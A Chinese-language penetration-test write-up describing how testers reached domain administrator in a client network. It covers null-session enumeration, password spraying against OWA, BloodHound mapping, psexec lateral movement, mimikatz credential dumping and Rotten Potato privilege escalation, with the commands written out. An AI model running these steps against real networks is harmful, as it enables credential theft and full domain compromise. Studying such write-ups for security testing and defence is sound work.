# Domain admin in 30 minutes
这是一个实际的内网渗透测试经历，文中客户名显然已经被删了。
这里的目标是从仅能通过网络访问到获得域管理员的权限。这个过程持续了30分钟，并且是在实际的渗透测试中。
一些关键点：
* 这个特定的客户已经从工作站中移除了常规用户作为本地管理员，因此使用 responding 和中继并没有给我们带来太多帮助。这毕竟是一个非常古老的攻击向量，尽管当常规用户是他们工作站上的本地管理员时，这种方法具有非常好的成功率。
* 确实存在一些运气成分，但是如此庞大的域和这么多的管理员，总会有一种方式得到DA
* 策略不允许域管理员远程访问工作站。
* 五次尝试后，管理员和域管理员用户都会被锁定。
* 不要锁定任何人的账号是最重要的！
* 使用HTTPS meterpreter shell以避免被阻断。
* 不要将exe文件放在主机上，如果放了，记得完事之后要清理掉。
## 在域控制器(DC)上的空会话
使用nessus做了一次快速的扫描，可能做了一些其他的事情来寻找域控制器，类似于nmap或者其他的windows命令。
使用如下命令检查域控制器是否支持空会话。
```powershell
enum4linux -a 
```
域控制器给我们所有我们需要的信息。
所有机器，所有用户，包括管理员和域管理员的列表。
奖励：每个组的成员身份和密码策略。
密码策略显示，常规用户不会被锁定，并且没有密码复杂度要求。
搞起！
## Password spraying
每个普通用户都有三个字母的用户名。我们把它们列出来。我们不想阻塞管理员用户（他们通常有锁定机制）。500个用户名要被测试。
没有复杂性要求 = 狗屎密码。这个测试是在2017年圣诞节期间进行的，因此我们列出了相关密码并检查了两次：
* Winter2017
* winter2017
* christmas2017
* Christmas2017
现在我们需要一个地方来尝试这些密码。在 SMB 上尝试大量失败的身份验证可能会被检测到，并且无论如何这种东西在Burp中更容易被设置。我们使用 Burp Intruder 加载用户名和密码的列表，并将其目标指向外部 OWA 电子邮件服务器，域名其实上并不难猜。
```
www.mail.customer.com
```
现在我们启动 burp, 用这四个密码去爆破这500个用户。
大概花5秒钟在 Burp 中过滤 200 OK，然后找到哪些是验证正确的。也可以根据响应的大小进行排序，以便轻松找到有用的信息。现在搞到一些普通用户登录凭据。我们有的忙了！请记住，密码没有锁定机制，所以我们可以一直尝试密码，直到有人来到我们所在的小会议室门口。想想。所以我们得到了一个用户名叫做 ank 的凭据。
## 使用常规用户权限创建域的映射
现在记住这个用户不是管理员，但Active Directory的工作方式允许我们映射整个域。语法是：
```powershell
runas /netonly /FQDN\user cmd.exe
```
所以我们运行以下命令：
```powershell
runas /netonly /user:customer\ank powershell
```
出现提示时输入密码 `winter2017`,    此查询在域控制器上执行，如果成功，我们基本上可以在DC上转发和执行的查询。这不是远程代码执行或任何类型的漏洞，只是固有的功能。我们现在准备用 Bloodhound 制作一张地图，所以如果你没有使用本书的指南进行设置，赶紧设置下。然后继续加载并执行 SharpHound.ps1。根据域和 域内活动 的不同，需要一些时间。在忙碌的白天，在有几千个工作站和服务器的公司办公室中，这需要30分钟才能完成。
```powershell
1 Powershell -exec bypass
2 Import-module SharpHound.ps1
3 Invoke-BloodHound -CollectionMethod ACL，ObjectProps，Default -CompressData -SkipPing
```
等待20分钟就可以获取整个域的完整地图（3000个主机）。现在使用导入功能将其全部加载到 Bloodhound 中，只需将整个 ZIP 文件放在那里。现在 BloodHound 有一些非常有用的默认查询。既然我们想要域管理员权限，我们想知道这是否是一条见到那的路。
```powershell
Find shortest path to domain admin
```
现在我们留意一下已经知道的信息。域管理员的数量太多了！此外，参考 DC 上的空会话枚举的输出结果，我们看到，作为服务帐户高度敏感的域管理员用户名。我们之前没有尝试过用相同的用户名和密码登录域管理员账号。信不信由你，其中一个域管理员就是密码和用户名一样的，这显然是荒谬的。我们本可以将获取 DA 从30分钟缩短到30秒的，但不想通过疯狂的爆破域管理员密码，因为这会被很快检测到，也可能阻碍域管理员的工作。这样这不太好！
## 寻找有域管理员的主机
既然有一个很好用的地图，我们需要接近有域管理员的那台主机，以便以某种方式得到用户权限或凭据。因为这个客户已经从工作站删除了所有类型的本地管理员，我们可以访问的普通用户基本上没有足够的权限，除非Bloodhound 牛逼地搞出一台有本地管理员的主机。WTF？显然，他们从工作站中严格删除了本地管理员，但他们忘记了这个仍在使用的工作站 。因此，在我们能进入这个具有域管理员的主机之前，我们需要一个中间步骤，转到我们可以访问的这个工作站，该主机的还有 psexec（SMB 共享登录）和 RDP（远程桌面）登录管理员。因为域中的每个用户都可以访问这个主机，所以我们可以直接访问到它。幸运的是，管理员用户也登录到这个主机。
现在我们用 msf
```powershell
exploit/windows/smb/psexec_psh
```
我们现在在该工作站上搞到了一个本地管理员的shell，因此我们可以运行 mimikatz。从 metasploit 上直接加载并执行 mimikatz 到内存：
```
load mimikatz
mimikatz_command -f sekurlsa::logonPasswords full
```
我们现在以明文形式转储管理员用户的密码和哈希值（很容易认出哪些是管理员，因为该域中的所有管理员用户在用户名中都有“admin”）。检查一下此管理员用户的权限，然后找到一个包含多个域管理员的主机，该用户也可以访问那个主机。
到最后一步！
## 权限从管理员升级到域管理员
我们用 `psexec_psh` 从具有域管理员的主机上拿到一个shell。我们还不是这个主机的本地管理员，所以不能跑mimikatz。幸运的是，还有其他方法可以提权。Rotten Potato 是一种提权技术，在这种场景下适用。使用这种技术，我们可以将Windows工作站上的最低级别的权限提升到“NT AUTHORITY\SYSTEM”- Windows机器上可用的最高权限。在 Meterpreter 中执行以下操作：
```powershell
getuid
getprivs
upload /root/just_dce_64.exe c:\\temp\\rot.exe
load incognito
list_tokens -u
execute -Hc -f ./rot.exe
impersonate_token "NT AUTHORITY\\SYSTEM"
getprivs
```
我们现在是这个主机上的 SYSTEM 用户，并且可以运行 mimikatz 转储任何在这个主机上记录的域管理员的明文凭证。或者，我们可以使用 rotten potato 来冒充域管理员。只需用你要模拟的用户名替换上面的 impersonate_token 命令中的用户名。
恭喜你现在是域名管理员！